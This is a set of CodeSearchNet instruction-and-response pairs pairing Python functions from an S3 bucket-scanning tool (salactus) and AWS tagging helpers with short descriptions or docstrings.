{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef page_strip(page, versioned):\n    # page strip filtering should be conditional\n    page.pop('ResponseMetadata', None)\n    contents_key = versioned and 'Versions' or 'Contents'\n    contents = page.get(contents_key, ())\n\n    # aggressive size\n    if versioned:\n        keys = []\n        for k in contents:\n            if k['IsLatest']:\n                keys.append((k['Key'], k['VersionId'], True))\n            else:\n                keys.append((k['Key'], k['VersionId']))\n        return keys\n    else:\n        return [k['Key'] for k in contents]\n\n    if not contents:\n        return page\n\n    # Depending on use case we may want these\n    for k in contents:\n        k.pop('Owner', None)\n        k.pop('LastModified', None)\n        k.pop('ETag', None)\n        k.pop('StorageClass', None)\n        k.pop('Size', None)\n\n    return page", "response": "Remove bits in content results to minimize memory utilization."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nscanning all buckets in an account and schedule processing", "response": "def process_account(account_info):\n    \"\"\"Scan all buckets in an account and schedule processing\"\"\"\n    log = logging.getLogger('salactus.bucket-iterator')\n    log.info(\"processing account %s\", account_info)\n    session = get_session(account_info)\n    client = session.client('s3', config=s3config)\n    buckets = client.list_buckets()['Buckets']\n\n    connection.hset(\n        'bucket-accounts', account_info['name'], json.dumps(account_info))\n\n    for b in buckets:\n        connection.hset(\n            'bucket-ages', bucket_id(account_info, b['Name']),\n            b['CreationDate'].isoformat())\n\n    account_buckets = account_info.pop('buckets', None)\n    buckets = [n['Name'] for n in buckets\n               if not account_buckets or\n               n['Name'] in account_buckets]\n    account_not_buckets = account_info.pop('not-buckets', None)\n    buckets = [n for n in buckets\n               if not account_not_buckets or\n               n not in account_not_buckets]\n    log.info(\"processing %d buckets in account %s\",\n             len(buckets), account_info['name'])\n    for bucket_set in chunks(buckets, 50):\n        invoke(process_bucket_set, account_info, bucket_set)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nprocess a collection of buckets.", "response": "def process_bucket_set(account_info, buckets):\n    \"\"\"Process a collection of buckets.\n\n    For each bucket fetch location, versioning and size and\n    then kickoff processing strategy based on size.\n    \"\"\"\n    region_clients = {}\n    log = logging.getLogger('salactus.bucket-set')\n    log.info(\"processing account %s\", account_info)\n    session = get_session(account_info)\n    client = session.client('s3', config=s3config)\n\n    for b in buckets:\n        bid = bucket_id(account_info, b)\n        with bucket_ops(bid):\n            info = {'name': b}\n            error = None\n\n            try:\n                location = client.get_bucket_location(\n                    Bucket=b).get('LocationConstraint')\n            except Exception as e:\n                error = e\n                location = None\n\n            if location is None:\n                region = \"us-east-1\"\n            elif location == 'EU':\n                region = \"eu-west-1\"\n            else:\n                region = location\n\n            if (account_info.get('regions', ()) and\n                    region not in account_info.get('regions', ())):\n                continue\n\n            info['region'] = region\n            if region not in region_clients:\n                region_clients.setdefault(region, {})\n                region_clients[region]['s3'] = s3 = session.client(\n                    's3', region_name=region, config=s3config)\n                region_clients[region]['cloudwatch'] = cw = session.client(\n                    'cloudwatch', region_name=region, config=s3config)\n            else:\n                s3 = region_clients[region]['s3']\n                cw = region_clients[region]['cloudwatch']\n\n            try:\n                info['keycount'] = bucket_key_count(cw, info)\n            except Exception:\n                raise\n            else:\n                connection.hset('bucket-sizes', bid, info['keycount'])\n\n            if error:\n                raise error\n\n            connection.hset('bucket-regions', bid, region)\n\n            versioning = s3.get_bucket_versioning(Bucket=b)\n            info['versioned'] = (\n                versioning and versioning.get('Status', '')\n                in ('Enabled', 'Suspended') or False)\n            connection.hset('bucket-versions', bid, int(info['versioned']))\n\n            log.info(\"processing bucket %s\", info)\n            connection.hset('bucket-starts', bid, time.time())\n            dispatch_object_source(s3, account_info, bid, info)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nselecting and dispatch an object source for a bucket.", "response": "def dispatch_object_source(client, account_info, bid, bucket_info):\n    \"\"\"Select and dispatch an object source for a bucket.\n\n    Choices are bucket partition, inventory, or direct pagination.\n    \"\"\"\n\n    if (account_info.get('inventory') and\n        bucket_info['keycount'] >\n            account_info['inventory'].get('bucket-size-threshold',\n                                          DEFAULT_INVENTORY_BUCKET_SIZE_THRESHOLD)):\n        inventory_info = get_bucket_inventory(\n            client,\n            bucket_info['name'],\n            account_info['inventory'].get('id-selector', '*'))\n        if inventory_info is not None:\n            return invoke(\n                process_bucket_inventory, bid,\n                inventory_info['bucket'], inventory_info['prefix'])\n\n    if bucket_info['keycount'] > PARTITION_BUCKET_SIZE_THRESHOLD:\n        invoke(process_bucket_partitions, bid)\n    else:\n        invoke(process_bucket_iterator, bid)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nuses set of keys as selector for character superset of a keyset.", "response": "def get_keys_charset(keys, bid):\n    \"\"\" Use set of keys as selector for character superset\n\n    Note this isn't optimal, its probabilistic on the keyset char population.\n    \"\"\"\n    # use the keys found to sample possible chars\n    chars = set()\n    for k in keys:\n        chars.update(k[:4])\n    remainder = chars\n\n    # Normalize charsets for matching\n    normalized = {}\n    for n, sset in [\n        (\"p\", set(string.punctuation)),\n        (\"w\", set(string.whitespace))\n    ]:\n        m = chars.intersection(sset)\n        if m:\n            normalized[n] = m\n            remainder = remainder.difference(sset)\n\n    # Detect character sets\n    charset = None\n    for candidate in CharSet.charsets():\n        if remainder.issubset(candidate):\n            charset = candidate\n            break\n\n    if charset is None:\n        raise ValueError(\n            \"Bucket: %s Failed charset ngram detection %r\\n%s\" % (\n                bid, \"\".join(chars)), \"\\n\".join(sorted(keys)))\n\n    for n, sset in normalized.items():\n        charset = charset.symmetric_difference(sset)\n\n    return charset"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ndetects the partition strategy for a large bucket.", "response": "def detect_partition_strategy(bid, delimiters=('/', '-'), prefix=''):\n    \"\"\"Try to detect the best partitioning strategy for a large bucket\n\n    Consider nested buckets with common prefixes, and flat buckets.\n    \"\"\"\n    account, bucket = bid.split(\":\", 1)\n    region = connection.hget('bucket-regions', bid)\n    versioned = bool(int(connection.hget('bucket-versions', bid)))\n    size = int(float(connection.hget('bucket-sizes', bid)))\n    session = get_session(\n        json.loads(connection.hget('bucket-accounts', account)))\n    s3 = session.client('s3', region_name=region, config=s3config)\n\n    (contents_key,\n     contents_method,\n     continue_tokens) = BUCKET_OBJ_DESC[versioned]\n\n    with bucket_ops(bid, 'detect'):\n        keys = set()\n        for delimiter in delimiters:\n            method = getattr(s3, contents_method, None)\n            results = method(\n                Bucket=bucket, Prefix=prefix, Delimiter=delimiter)\n            prefixes = [p['Prefix'] for p in results.get('CommonPrefixes', [])]\n            contents = results.get(contents_key, [])\n            keys.update([k['Key'] for k in contents])\n            # If we have common prefixes within limit thresholds go wide\n            if (len(prefixes) > 0 and\n                len(prefixes) < 1000 and\n                    len(contents) < 1000):\n                log.info(\n                    \"%s detected prefix delimiter:%s contents:%d prefixes:%d\",\n                    bid, delimiter, len(contents), len(prefixes))\n                limit = prefix and 2 or 4\n                return process_bucket_partitions(\n                    bid, partition=delimiter,\n                    strategy='p', prefix_set=prefixes, limit=limit)\n\n    # Detect character sets\n    charset = get_keys_charset(keys, bid)\n    log.info(\"Detected charset %s for %s\", charset, bid)\n\n    # Determine the depth we need to keep total api calls below threshold\n    scan_count = size / 1000.0\n    for limit in range(1, 4):\n        if math.pow(len(charset), limit) * 1000 > scan_count:\n            break\n\n    # Dispatch\n    prefixes = ('',)\n    prefixes = NGramPartition(\n        charset, limit=limit).initialize_prefixes(prefixes)\n\n    #\n    random.shuffle(prefixes)\n\n    # Pregen on ngram means we have many potentially useless prefixes\n    # todo carry charset forward as param, and go incremental on prefix\n    # ngram expansion\n    connection.hincrby('bucket-partition', bid, len(prefixes))\n    return bulk_invoke(\n        process_bucket_iterator, [bid], prefixes)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef process_bucket_partitions(\n        bid, prefix_set=('',), partition='/', strategy=None, limit=4):\n    \"\"\"Split up a bucket keyspace into smaller sets for parallel iteration.\n    \"\"\"\n    if strategy is None:\n        return detect_partition_strategy(bid)\n\n    account, bucket = bid.split(':', 1)\n    region = connection.hget('bucket-regions', bid)\n    versioned = bool(int(connection.hget('bucket-versions', bid)))\n    session = get_session(\n        json.loads(connection.hget('bucket-accounts', account)))\n    size = int(float(connection.hget('bucket-sizes', bid)))\n    s3 = session.client('s3', region_name=region, config=s3config)\n\n    strategy = get_partition_strategy(strategy)\n    strategy.limit = limit\n    strategy.partition = partition\n    (contents_key,\n     contents_method,\n     continue_tokens) = BUCKET_OBJ_DESC[versioned]\n    prefix_queue = strategy.initialize_prefixes(prefix_set)\n\n    keyset = []\n    log.info(\n        \"Process partition bid:%s strategy:%s delimiter:%s queue:%d limit:%d\",\n        bid, strategy.__class__.__name__[0], partition,\n        len(prefix_queue), limit)\n\n    def statm(prefix):\n        return \"keyset:%d queue:%d prefix:%s bucket:%s size:%d\" % (\n            len(keyset), len(prefix_queue), prefix, bid, size)\n\n    while prefix_queue:\n        connection.hincrby('bucket-partition', bid, 1)\n        prefix = prefix_queue.pop()\n        if strategy.is_depth_exceeded(prefix):\n            log.info(\"Partition max depth reached, %s\", statm(prefix))\n            invoke(process_bucket_iterator, bid, prefix)\n            continue\n        method = getattr(s3, contents_method, None)\n        results = method(Bucket=bucket, Prefix=prefix, Delimiter=partition)\n        keyset.extend(results.get(contents_key, ()))\n\n        # As we probe we find keys, process any found\n        if len(keyset) > PARTITION_KEYSET_THRESHOLD:\n            log.info(\"Partition, processing keyset %s\", statm(prefix))\n            page = page_strip({contents_key: keyset}, versioned)\n            if page:\n                invoke(process_keyset, bid, page)\n            keyset = []\n\n        strategy.find_partitions(prefix_queue, results)\n\n        # Do we have more than 1k keys at this level, continue iteration\n        continuation_params = {\n            k: results[k] for k in continue_tokens if k in results}\n        if continuation_params:\n            bp = int(connection.hget('bucket-partition', bid))\n            log.info(\"Partition has 1k keys, %s %s\", statm(prefix), bp)\n            if not prefix_queue and bp < 5:\n                log.info(\"Recursive detection\")\n                return detect_partition_strategy(bid, prefix=prefix)\n\n            invoke(process_bucket_iterator, bid, prefix, delimiter=partition,\n                   **continuation_params)\n\n        # If the queue get too deep, then go parallel\n        if len(prefix_queue) > PARTITION_QUEUE_THRESHOLD:\n            log.info(\"Partition add friends, %s\", statm(prefix))\n            for s_prefix_set in chunks(\n                    prefix_queue[PARTITION_QUEUE_THRESHOLD - 1:],\n                    PARTITION_QUEUE_THRESHOLD - 1):\n\n                for s in list(s_prefix_set):\n                    if strategy.is_depth_exceeded(prefix):\n                        invoke(process_bucket_iterator, bid, s)\n                        s_prefix_set.remove(s)\n\n                if not s_prefix_set:\n                    continue\n                invoke(process_bucket_partitions,\n                       bid,\n                       prefix_set=s_prefix_set, partition=partition,\n                       strategy=strategy, limit=limit)\n            prefix_queue = prefix_queue[:PARTITION_QUEUE_THRESHOLD - 1]\n\n    if keyset:\n        page = page_strip({contents_key: keyset}, versioned)\n        if page:\n            invoke(process_keyset, bid, page)", "response": "Process a set of partitions for a given bucket."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef process_bucket_inventory(bid, inventory_bucket, inventory_prefix):\n    log.info(\"Loading bucket %s keys from inventory s3://%s/%s\",\n             bid, inventory_bucket, inventory_prefix)\n    account, bucket = bid.split(':', 1)\n    region = connection.hget('bucket-regions', bid)\n    versioned = bool(int(connection.hget('bucket-versions', bid)))\n    session = boto3.Session()\n    s3 = session.client('s3', region_name=region, config=s3config)\n\n    # find any key visitors with inventory filtering\n    account_info = json.loads(connection.hget('bucket-accounts', account))\n    ifilters = [v.inventory_filter for v\n                in get_key_visitors(account_info) if v.inventory_filter]\n\n    with bucket_ops(bid, 'inventory'):\n        page_iterator = load_bucket_inventory(\n            s3, inventory_bucket, inventory_prefix, versioned, ifilters)\n        if page_iterator is None:\n            log.info(\"bucket:%s could not find inventory\" % bid)\n            # case: inventory configured but not delivered yet\n            # action: dispatch to bucket partition (assumes 100k+ for inventory)\n            # - todo consider max inventory age/staleness for usage\n            return invoke(process_bucket_partitions, bid)\n        connection.hset('buckets-inventory', bid, 1)\n        for page in page_iterator:\n            invoke(process_keyset, bid, page)", "response": "Load last inventory dump and feed as key source."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef process_bucket_iterator(bid, prefix=\"\", delimiter=\"\", **continuation):\n    log.info(\"Iterating keys bucket %s prefix %s delimiter %s\",\n             bid, prefix, delimiter)\n\n    account, bucket = bid.split(':', 1)\n    region = connection.hget('bucket-regions', bid)\n    versioned = bool(int(connection.hget('bucket-versions', bid)))\n    session = get_session(\n        json.loads(connection.hget('bucket-accounts', account)))\n    s3 = session.client('s3', region_name=region, config=s3config)\n\n    (contents_key, contents_method, _) = BUCKET_OBJ_DESC[versioned]\n\n    params = dict(Bucket=bucket)\n    if prefix:\n        params['Prefix'] = prefix\n    if delimiter:\n        params['Delimiter'] = delimiter\n    if continuation:\n        params.update({k[4:]: v for k, v in continuation.items()})\n    paginator = s3.get_paginator(contents_method).paginate(**params)\n    with bucket_ops(bid, 'page'):\n        ptime = time.time()\n        pcounter = 0\n        for page in paginator:\n            page = page_strip(page, versioned)\n            pcounter += 1\n            if page:\n                invoke(process_keyset, bid, page)\n\n            if pcounter % 10 == 0:\n                with connection.pipeline() as p:\n                    nptime = time.time()\n                    p.hincrby('bucket-pages', bid, 1)\n                    p.hincrby('bucket-pages-time', bid, int(nptime - ptime))\n                    ptime = nptime\n                    p.execute()\n\n        if pcounter % 10:\n            with connection.pipeline() as p:\n                nptime = time.time()\n                p.hincrby('bucket-pages', bid, 1)\n                p.hincrby('bucket-pages-time', bid, int(nptime - ptime))\n                p.execute()", "response": "Process a single bucket iterator."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef universal_retry(method, ResourceARNList, **kw):\n    max_attempts = 6\n\n    for idx, delay in enumerate(\n            utils.backoff_delays(1.5, 2 ** 8, jitter=True)):\n        response = method(ResourceARNList=ResourceARNList, **kw)\n        failures = response.get('FailedResourcesMap', {})\n        if not failures:\n            return response\n\n        errors = {}\n        throttles = set()\n\n        for f_arn in failures:\n            error_code = failures[f_arn]['ErrorCode']\n            if error_code == 'ThrottlingException':\n                throttles.add(f_arn)\n            elif error_code == 'ResourceNotFoundException':\n                continue\n            else:\n                errors[f_arn] = error_code\n\n        if errors:\n            raise Exception(\"Resource Tag Errors %s\" % (errors))\n\n        if idx == max_attempts - 1:\n            raise Exception(\"Resource Tag Throttled %s\" % (\", \".join(throttles)))\n\n        time.sleep(delay)\n        ResourceARNList = list(throttles)", "response": "Universal retry support for resourcegroup tagging apis."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef coalesce_copy_user_tags(resource, copy_tags, user_tags):\n\n    assert isinstance(copy_tags, bool) or isinstance(copy_tags, list)\n    assert isinstance(user_tags, dict) or isinstance(user_tags, list)\n\n    r_tags = resource.get('Tags', [])\n\n    if isinstance(copy_tags, list):\n        if '*' in copy_tags:\n            copy_keys = set([t['Key'] for t in r_tags])\n        else:\n            copy_keys = set(copy_tags)\n\n    if isinstance(copy_tags, bool):\n        if copy_tags is True:\n            copy_keys = set([t['Key'] for t in r_tags])\n        else:\n            copy_keys = set()\n\n    if isinstance(user_tags, dict):\n        user_tags = [{'Key': k, 'Value': v} for k, v in user_tags.items()]\n\n    user_keys = set([t['Key'] for t in user_tags])\n    tags_diff = list(copy_keys.difference(user_keys))\n    resource_tags_to_copy = [t for t in r_tags if t['Key'] in tags_diff]\n    user_tags.extend(resource_tags_to_copy)\n    return user_tags", "response": "Coalesce the tags from a resource and user supplied tags."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nprocessing a rename request.", "response": "def process_rename(self, client, tag_value, resource_set):\n        \"\"\"\n        Move source tag value to destination tag value\n\n        - Collect value from old tag\n        - Delete old tag\n        - Create new tag & assign stored value\n        \"\"\"\n        self.log.info(\"Renaming tag on %s instances\" % (len(resource_set)))\n        old_key = self.data.get('old_key')\n        new_key = self.data.get('new_key')\n\n        # We have a preference to creating the new tag when possible first\n        resource_ids = [r[self.id_key] for r in resource_set if len(\n            r.get('Tags', [])) < self.tag_count_max]\n        if resource_ids:\n            self.create_tag(client, resource_ids, new_key, tag_value)\n\n        self.delete_tag(\n            client, [r[self.id_key] for r in resource_set], old_key, tag_value)\n\n        # For resources with 50 tags, we need to delete first and then create.\n        resource_ids = [r[self.id_key] for r in resource_set if len(\n            r.get('Tags', [])) > self.tag_count_max - 1]\n        if resource_ids:\n            self.create_tag(client, resource_ids, new_key, tag_value)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nprocesses the transform tag value for the resource set", "response": "def process_transform(self, tag_value, resource_set):\n        \"\"\"\n        Transform tag value\n\n        - Collect value from tag\n        - Transform Tag value\n        - Assign new value for key\n        \"\"\"\n        self.log.info(\"Transforming tag value on %s instances\" % (\n            len(resource_set)))\n        key = self.data.get('key')\n\n        c = utils.local_session(self.manager.session_factory).client('ec2')\n\n        self.create_tag(\n            c,\n            [r[self.id_key] for r in resource_set if len(\n                r.get('Tags', [])) < 50],\n            key, tag_value)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_resource_tag_map(self, r_type, ids):\n        manager = self.manager.get_resource_manager(r_type)\n        r_id = manager.resource_type.id\n        # TODO only fetch resource with the given ids.\n        return {\n            r[r_id]: {t['Key']: t['Value'] for t in r.get('Tags', [])}\n            for r in manager.resources() if r[r_id] in ids\n        }", "response": "Returns a mapping of resource_id to tagkey - > tagvalue"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns a mapping of launch configs for the given set of asgs", "response": "def get_launch_configs(self, asgs):\n        \"\"\"Return a mapping of launch configs for the given set of asgs\"\"\"\n        config_names = set()\n        for a in asgs:\n            if 'LaunchConfigurationName' not in a:\n                continue\n            config_names.add(a['LaunchConfigurationName'])\n        if not config_names:\n            return {}\n        lc_resources = self.manager.get_resource_manager('launch-config')\n        if len(config_names) < 5:\n            configs = lc_resources.get_resources(list(config_names))\n        else:\n            configs = lc_resources.resources()\n        return {\n            cfg['LaunchConfigurationName']: cfg for cfg in configs\n            if cfg['LaunchConfigurationName'] in config_names}"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_resources(self, ids, cache=True):\n        if ids[0].startswith('arn:'):\n            params = {'LoadBalancerArns': ids}\n        else:\n            params = {'Names': ids}\n        return self.query.filter(self.manager, **params)", "response": "Support server side filtering on arns or names"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef validate(config):\n    with open(config) as fh:\n        data = utils.yaml_load(fh.read())\n        jsonschema.validate(data, CONFIG_SCHEMA)", "response": "Validate a configuration file."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nrunning across a set of accounts and buckets.", "response": "def run(config, tag, bucket, account, not_bucket, not_account, debug, region):\n    \"\"\"Run across a set of accounts and buckets.\"\"\"\n    logging.basicConfig(\n        level=logging.INFO,\n        format=\"%(asctime)s: %(name)s:%(levelname)s %(message)s\")\n    logging.getLogger('botocore').setLevel(level=logging.WARNING)\n\n    if debug:\n        def invoke(f, *args, **kw):\n            # if f.func_name == 'process_keyset':\n            #    key_count = len(args[-1])\n            #    print(\"debug skip keyset %d\" % key_count)\n            #    return\n            return f(*args, **kw)\n        worker.invoke = invoke\n\n    with open(config) as fh:\n        data = utils.yaml_load(fh.read())\n        for account_info in data.get('accounts', ()):\n            if tag and tag not in account_info.get('tags', ()):\n                continue\n            if account and account_info['name'] not in account:\n                continue\n            if not_account and account_info['name'] in not_account:\n                continue\n            if 'inventory' in data and 'inventory' not in account_info:\n                account_info['inventory'] = data['inventory']\n            if 'visitors' in data and 'visitors' not in account_info:\n                account_info['visitors'] = data['visitors']\n            if 'object-reporting' in data and 'object-reporting' not in account_info:\n                account_info['object-reporting'] = data['object-reporting']\n                account_info['object-reporting'][\n                    'record-prefix'] = datetime.utcnow().strftime('%Y/%m/%d')\n            if bucket:\n                account_info['buckets'] = bucket\n            if not_bucket:\n                account_info['not-buckets'] = not_bucket\n            if region:\n                account_info['regions'] = region\n\n            try:\n                worker.invoke(worker.process_account, account_info)\n            except Exception:\n                if not debug:\n                    raise\n                import pdb, traceback, sys\n                traceback.print_exc()\n                pdb.post_mortem(sys.exc_info()[-1])\n                raise"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ndeleting all persistent cluster state.", "response": "def reset(c7n_async=None):\n    \"\"\"Delete all persistent cluster state.\n    \"\"\"\n    click.echo('Delete db? Are you Sure? [yn] ', nl=False)\n    c = click.getchar()\n    click.echo()\n    if c == 'y':\n        click.echo('Wiping database')\n        worker.connection.flushdb()\n    elif c == 'n':\n        click.echo('Abort!')\n    else:\n        click.echo('Invalid input :(')"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nshow information on salactus workers.", "response": "def workers():\n    \"\"\"Show information on salactus workers. (slow)\"\"\"\n    counter = Counter()\n    for w in Worker.all(connection=worker.connection):\n        for q in w.queues:\n            counter[q.name] += 1\n    import pprint\n    pprint.pprint(dict(counter))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreporting on stats by account", "response": "def accounts(dbpath, output, format, account,\n             config=None, tag=None, tagprefix=None, region=(),\n             not_region=(), not_bucket=None):\n    \"\"\"Report on stats by account\"\"\"\n    d = db.db(dbpath)\n    accounts = d.accounts()\n    formatter = (\n        format == 'csv' and format_accounts_csv or format_accounts_plain)\n\n    if region:\n        for a in accounts:\n            a.buckets = [b for b in a.buckets if b.region in region]\n        accounts = [a for a in accounts if a.bucket_count]\n\n    if not_region:\n        for a in accounts:\n            a.buckets = [b for b in a.buckets if b.region not in not_region]\n        accounts = [a for a in accounts if a.bucket_count]\n\n    if not_bucket:\n        for a in accounts:\n            a.buckets = [b for b in a.buckets if b.name not in not_bucket]\n    if config and tagprefix:\n        account_map = {account.name: account for account in accounts}\n\n        with open(config) as fh:\n            account_data = json.load(fh).get('accounts')\n        tag_groups = {}\n        for a in account_data:\n            if tag is not None and tag not in a['tags']:\n                continue\n\n            for t in a['tags']:\n                if t.startswith(tagprefix):\n                    tvalue = t[len(tagprefix):]\n                    if not tvalue:\n                        continue\n                    if tvalue not in tag_groups:\n                        tag_groups[tvalue] = db.Account(tvalue, [])\n                    account_results = account_map.get(a['name'])\n                    if not account_results:\n                        print(\"missing %s\" % a['name'])\n                        continue\n                    tag_groups[tvalue].buckets.extend(\n                        account_map[a['name']].buckets)\n        accounts = tag_groups.values()\n\n    formatter(accounts, output)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreport on stats by bucket", "response": "def buckets(bucket=None, account=None, matched=False, kdenied=False,\n            errors=False, dbpath=None, size=None, denied=False,\n            format=None, incomplete=False, oversize=False, region=(),\n            not_region=(), inventory=None, output=None, config=None, sort=None,\n            tagprefix=None, not_bucket=None):\n    \"\"\"Report on stats by bucket\"\"\"\n\n    d = db.db(dbpath)\n\n    if tagprefix and not config:\n        raise ValueError(\n            \"account tag value inclusion requires account config file\")\n\n    if config and tagprefix:\n        with open(config) as fh:\n            data = json.load(fh).get('accounts')\n            account_data = {}\n            for a in data:\n                for t in a['tags']:\n                    if t.startswith(tagprefix):\n                        account_data[a['name']] = t[len(tagprefix):]\n\n    buckets = []\n    for b in sorted(d.buckets(account),\n                    key=operator.attrgetter('bucket_id')):\n        if bucket and b.name not in bucket:\n            continue\n        if not_bucket and b.name in not_bucket:\n            continue\n        if matched and not b.matched:\n            continue\n        if kdenied and not b.keys_denied:\n            continue\n        if errors and not b.error_count:\n            continue\n        if size and b.size < size:\n            continue\n        if inventory and not b.using_inventory:\n            continue\n        if denied and not b.denied:\n            continue\n        if oversize and b.scanned <= b.size:\n            continue\n        if incomplete and b.percent_scanned >= incomplete:\n            continue\n        if region and b.region not in region:\n            continue\n        if not_region and b.region in not_region:\n            continue\n        if tagprefix:\n            setattr(b, tagprefix[:-1], account_data[b.account])\n        buckets.append(b)\n\n    if sort:\n        key = operator.attrgetter(sort)\n        buckets = list(reversed(sorted(buckets, key=key)))\n    formatter = format == 'csv' and format_csv or format_plain\n    keys = tagprefix and (tagprefix[:-1],) or ()\n    formatter(buckets, output, keys=keys)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef watch(limit):\n    period = 5.0\n    prev = db.db()\n    prev_totals = None\n\n    while True:\n        click.clear()\n        time.sleep(period)\n        cur = db.db()\n        cur.data['gkrate'] = {}\n        progress = []\n        prev_buckets = {b.bucket_id: b for b in prev.buckets()}\n\n        totals = {'scanned': 0, 'krate': 0, 'lrate': 0, 'bucket_id': 'totals'}\n\n        for b in cur.buckets():\n            if not b.scanned:\n                continue\n\n            totals['scanned'] += b.scanned\n            totals['krate'] += b.krate\n            totals['lrate'] += b.lrate\n\n            if b.bucket_id not in prev_buckets:\n                b.data['gkrate'][b.bucket_id] = b.scanned / period\n            elif b.scanned == prev_buckets[b.bucket_id].scanned:\n                continue\n            else:\n                b.data['gkrate'][b.bucket_id] = (\n                    b.scanned - prev_buckets[b.bucket_id].scanned) / period\n            progress.append(b)\n\n        if prev_totals is None:\n            totals['gkrate'] = '...'\n        else:\n            totals['gkrate'] = (totals['scanned'] - prev_totals['scanned']) / period\n        prev = cur\n        prev_totals = totals\n\n        progress = sorted(progress, key=lambda x: x.gkrate, reverse=True)\n\n        if limit:\n            progress = progress[:limit]\n\n        progress.insert(0, Bag(totals))\n        format_plain(\n            progress, None,\n            explicit_only=True,\n            keys=['bucket_id', 'scanned', 'gkrate', 'lrate', 'krate'])", "response": "watch scan rates across the cluster"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ndiscover the partitions on a bucket via introspection. For large buckets which lack s3 inventories, salactus will attempt to process objects in parallel on the bucket by breaking the bucket into a separate keyspace partitions. It does this with a heurestic that attempts to sample the keyspace and determine appropriate subparts. This command provides additional visibility into the partitioning of a bucket by showing how salactus would partition a given bucket.", "response": "def inspect_partitions(bucket):\n    \"\"\"Discover the partitions on a bucket via introspection.\n\n    For large buckets which lack s3 inventories, salactus will attempt\n    to process objects in parallel on the bucket by breaking the bucket\n    into a separate keyspace partitions. It does this with a heurestic\n    that attempts to sample the keyspace and determine appropriate subparts.\n\n    This command provides additional visibility into the partitioning of\n    a bucket by showing how salactus would partition a given bucket.\n    \"\"\"\n\n    logging.basicConfig(\n        level=logging.INFO,\n        format=\"%(asctime)s: %(name)s:%(levelname)s %(message)s\")\n    logging.getLogger('botocore').setLevel(level=logging.WARNING)\n\n    state = db.db()\n    # add db.bucket accessor\n    found = None\n    for b in state.buckets():\n        if b.name == bucket:\n            found = b\n            break\n    if not found:\n        click.echo(\"no bucket named: %s\" % bucket)\n        return\n\n    keyset = []\n    partitions = []\n\n    def process_keyset(bid, page):\n        keyset.append(len(page))\n\n    def process_bucket_iterator(bid, prefix, delimiter=\"\", **continuation):\n        partitions.append(prefix)\n\n    # synchronous execution\n    def invoke(f, *args, **kw):\n        return f(*args, **kw)\n\n    # unleash the monkies ;-)\n    worker.connection.hincrby = lambda x, y, z: True\n    worker.invoke = invoke\n    worker.process_keyset = process_keyset\n    worker.process_bucket_iterator = process_bucket_iterator\n\n    # kick it off\n    worker.process_bucket_partitions(b.bucket_id)\n\n    keys_scanned = sum(keyset)\n    click.echo(\n        \"Found %d partitions %s keys scanned during partitioning\" % (\n            len(partitions), keys_scanned))\n    click.echo(\"\\n\".join(partitions))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef inspect_bucket(bucket):\n    state = db.db()\n    found = None\n    for b in state.buckets():\n        if b.name == bucket:\n            found = b\n    if not found:\n        click.echo(\"no bucket named: %s\" % bucket)\n        return\n\n    click.echo(\"Bucket: %s\" % found.name)\n    click.echo(\"Account: %s\" % found.account)\n    click.echo(\"Region: %s\" % found.region)\n    click.echo(\"Created: %s\" % found.created)\n    click.echo(\"Size: %s\" % found.size)\n    click.echo(\"Inventory: %s\" % found.inventory)\n    click.echo(\"Partitions: %s\" % found.partitions)\n    click.echo(\"Scanned: %0.2f%%\" % found.percent_scanned)\n    click.echo(\"\")\n    click.echo(\"Errors\")\n\n    click.echo(\"Denied: %s\" % found.keys_denied)\n    click.echo(\"BErrors: %s\" % found.error_count)\n    click.echo(\"KErrors: %s\" % found.data['keys-error'].get(found.bucket_id, 0))\n    click.echo(\"Throttle: %s\" % found.data['keys-throttled'].get(found.bucket_id, 0))\n    click.echo(\"Missing: %s\" % found.data['keys-missing'].get(found.bucket_id, 0))\n    click.echo(\"Session: %s\" % found.data['keys-sesserr'].get(found.bucket_id, 0))\n    click.echo(\"Connection: %s\" % found.data['keys-connerr'].get(found.bucket_id, 0))\n    click.echo(\"Endpoint: %s\" % found.data['keys-enderr'].get(found.bucket_id, 0))", "response": "Show all information known on a bucket."}
